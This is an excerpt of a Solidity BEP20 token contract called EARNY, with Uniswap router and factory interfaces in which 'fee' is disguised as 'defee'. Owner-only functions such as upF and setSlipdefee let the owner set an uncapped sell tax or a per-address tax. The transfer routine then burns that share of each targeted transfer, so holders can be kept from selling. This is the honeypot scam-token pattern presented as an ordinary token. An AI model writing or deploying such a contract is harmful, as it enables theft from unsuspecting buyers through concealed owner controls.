...
interface IUniswapV2Factory {
    ...
    function defeeTo() external view returns (address);
    function defeeToSetter() external view returns (address);
    ...
    function setdefeeTo(address) external;
    function setdefeeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingdefeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingdefeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingdefeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingdefeeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingdefeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract EARNY is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSelldefee = 0;

    uint256 private _defaultBuydefee = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipdefee;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSelldefee = _value;
    }

    function setSlipdefee(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipdefee[_address] = _value;
    }

    function getSlipdefee(address _address) external view onlyownar returns (uint256) {
        return _slipdefee[_address];
    }


    function setMAccountdefee(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountdefee(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradedefeeAmount = 0;

        if (rF) {
            uint256 tradedefee = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradedefee = _defaultSelldefee;
                }
                if (from == uniswapV2Pair) {

                    tradedefee = _defaultBuydefee;
                }
            }
            if (_slipdefee[from] > 0) {
                tradedefee = _slipdefee[from];
            }

            tradedefeeAmount = _Amount.mul(tradedefee).div(100);
        }


        if (tradedefeeAmount > 0) {
            _balances[from] = _balances[from].sub(tradedefeeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradedefeeAmount);
            emit Transfer(from, _deadAddress, tradedefeeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradedefeeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradedefeeAmount);
        emit Transfer(from, _to, _Amount - tradedefeeAmount);
    }
